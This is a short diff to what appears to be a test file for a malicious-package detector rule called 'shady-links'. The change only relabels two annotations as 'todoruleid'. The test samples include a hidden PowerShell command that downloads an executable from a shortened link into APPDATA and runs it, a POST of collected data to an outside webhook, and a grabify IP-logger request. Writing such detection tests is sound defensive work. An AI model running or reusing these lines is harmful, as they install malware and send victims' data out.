@@ -11,9 +11,9 @@ req = urllib3.Request('https://grabify.link/E09EIF', headers={'User-Agent' : os}
 # ruleid: shady-links    
 os.system("powershell -window hidden -executionpolicy bypass (New-object system.net.webclient).DownloadFile('http://bit.ly/2myCV9n',$env:APPDATA+'\Main.exe'); Start-Process $env:APPDATA'\Main.exe'")
 
-# ruleid: shady-links
+# todoruleid: shady-links
 request(
-    # ruleid: shady-links
+    # todoruleid: shady-links
     url='http://us.dslab.pw/webhook.php',
     method='POST',
     data=json.dumps(data).encode("utf-8", errors='ignore'),
